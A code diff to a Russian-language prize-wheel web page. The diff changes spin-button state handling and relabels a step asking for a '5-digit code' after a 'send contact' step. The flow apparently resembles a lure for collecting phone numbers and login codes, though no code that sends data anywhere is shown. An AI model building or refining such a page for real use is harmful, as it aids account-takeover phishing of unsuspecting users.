@@ -95,8 +95,8 @@ body::before {
   border: none; border-radius: 14px;
   background: linear-gradient(135deg, #1a5fcc, #3d9eff);
   color: #fff; box-shadow: 0 0 18px rgba(61,158,255,.5);
+  cursor: pointer;
 }
-#spin:disabled { opacity: 0.4; box-shadow: none; }
 
 .used-overlay {
   display: none; position: fixed; inset: 0;
@@ -183,7 +183,7 @@ button#send:disabled { opacity: 0.4; box-shadow: none; }
     <button id="askContact">📱 Отправить контакт</button>
   </div>
   <div id="stepCode" class="step">
-    <h2>Введите код</h2>
+    <h2>Введите 5-значный код</h2>
     <div class="code">
       <input type="tel" maxlength="1" inputmode="numeric">
       <input type="tel" maxlength="1" inputmode="numeric">
@@ -257,7 +257,6 @@ function updateWheel(rot) {
   wheelBg.style.transform = `rotate(${rot}deg)`;
   const rotRad = rot * Math.PI / 180;
   imgEls.forEach((img, i) => {
-    // ← ИЗМЕНЁННАЯ СТРОКА: + 0.5 ставит картинку в центр сектора
     const a = rotRad + (i + 0.5) * STEP * Math.PI / 180;
     const x = R_IMG * Math.sin(a);
     const y = -R_IMG * Math.cos(a);
@@ -269,6 +268,7 @@ updateWheel(0);
 
 let currentRot = 0;
 let spinUsed   = false;
+let isSpinning = false;
 
 function easeOutQuart(t) { return 1 - Math.pow(1 - t, 4); }
 
@@ -288,19 +288,28 @@ const goToReg     = document.getElementById("goToReg");
 const usedOverlay = document.getElementById("usedOverlay");
 
 spinBtn.addEventListener("click", () => {
-  if (spinUsed) { usedOverlay.classList.add("show"); return; }
-  spinBtn.disabled = true;
+  if (spinUsed) {
+    usedOverlay.classList.add("show");
+    return;
+  }
+  if (isSpinning) return;
+  isSpinning = true;
+  spinBtn.style.opacity = "0.4";
+  spinBtn.style.cursor  = "default";
+
   const target = currentRot + 5 * 360 + Math.floor(Math.random() * 360);
-animateSpin(currentRot, target, 4000, () => {
-    spinUsed = true;
-    spinBtn.disabled = false; // ← возвращаем кнопку, чтобы клики работали
-    spinBtn.style.opacity = "0.5"; // ← визуально показываем, что использована
+  animateSpin(currentRot, target, 4000, () => {
+    isSpinning = false;
+    spinUsed   = true;
+    spinBtn.style.opacity = "0.5";
+
     const norm = ((target % 360) + 360) % 360;
     let idx = Math.round((360 - norm) / STEP) % COUNT;
     if (idx < 0) idx += COUNT;
     winImage.src = IMG_SRCS[idx];
     overlay.classList.add("show");
   });
+});
 
 goToReg.addEventListener("click", () => {
   overlay.classList.remove("show");
